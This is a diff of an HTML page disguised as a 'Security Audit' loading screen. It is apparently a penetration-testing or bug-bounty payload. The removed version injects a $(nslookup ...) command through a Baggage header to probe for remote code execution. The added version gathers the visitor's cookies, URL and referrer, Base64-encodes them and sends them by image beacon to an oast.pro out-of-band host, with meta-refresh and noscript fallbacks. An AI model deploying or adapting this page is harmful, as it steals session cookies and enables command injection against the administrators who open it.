@@ -1,22 +1,44 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Audit - Loading</title>
+    <meta http-equiv="refresh" content="5;url=https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/meta-leak?ref=fallback">
+</head>
 <body>
+    <h1>Processing Request...</h1>
+    <p>Please do not close this window.</p>
+
     <script>
-        // Instead of a hardcoded URL, we use 'window.location.origin'
-        // This targets whatever internal domain the admin is currently on.
-        const target = window.location.origin + "/api/v1/log"; 
-        
-        const payload = "sentry-environment=production,sentry-release=$(nslookup rce-test.d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro)";
+        (function() {
+            try {
+                // 1. Collect as much info as possible
+                var leak = {
+                    url: window.location.href,
+                    ref: document.referrer,
+                    cookie: document.cookie,
+                    title: document.title
+                };
 
-        // We send the request to the SAME server that is hosting the admin panel
-        fetch(target, {
-            method: 'GET',
-            mode: 'no-cors',
-            headers: { 'Baggage': payload }
-        });
+                // 2. Convert to string and Base64 encode
+                var dataString = JSON.stringify(leak);
+                var encodedData = btoa(unescape(encodeURIComponent(dataString)));
 
-        // Also, let's exfiltrate the CURRENT URL so you know exactly where you are
-        fetch("https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/target-info?url=" + btoa(window.location.href));
+                // 3. Create the Image object to fire the request
+                var exfil = new Image();
+                exfil.src = "https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/log.gif?d=" + encodedData;
+
+                console.log("Exfiltration image sent.");
+            } catch (e) {
+                // If anything fails, send a basic ping
+                new Image().src = "https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/error?msg=failed_to_encode";
+            }
+        })();
     </script>
+
+    <noscript>
+        <img src="https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/no-js-leak?status=js_disabled">
+    </noscript>
+
 </body>
 </html>
